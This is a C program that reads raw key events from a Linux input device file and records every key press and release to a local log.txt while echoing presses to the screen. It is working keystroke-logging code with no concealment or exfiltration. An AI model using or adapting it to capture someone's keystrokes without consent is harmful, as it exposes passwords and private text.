#include "keys.h"
#include <err.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define KEYS_MAX_INDEX 194

int main(int argc, char *argv[]) {

  if (argc != 2) {
    printf("Usage: %s <event-file>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  int fd = open(argv[1], O_RDONLY);
  if (fd == -1)
    err(EXIT_FAILURE, "open <event-file>");

  int out_fd = open("./log.txt", O_CREAT | O_WRONLY | O_TRUNC, 0644);
  if (out_fd == -1)
    err(EXIT_FAILURE, "open log.txt");

  struct input_event event;

  puts("Listening...");

  for (;;) {
    ssize_t n = read(fd, &event, sizeof(event));
    if (n == -1)
      err(EXIT_FAILURE, "read");
    if (n != sizeof(event))
      continue;

    if (event.type != EV_KEY)
      continue;

    if (event.code > KEYS_MAX_INDEX)
      continue;

    const char *state;

    switch (event.value) {
    case 0:
      state = " UP\n";
      break;
    case 1:
      state = " DOWN\n";
      printf("%s", hr_keys[event.code]);
      fflush(stdout);
      break;
    default:
      continue;
    }

    if (write(out_fd, keys[event.code], strlen(keys[event.code])) == -1)
      err(EXIT_FAILURE, "write");
    if (write(out_fd, state, strlen(state)) == -1)
      err(EXIT_FAILURE, "write");
  }

  return 0;
}
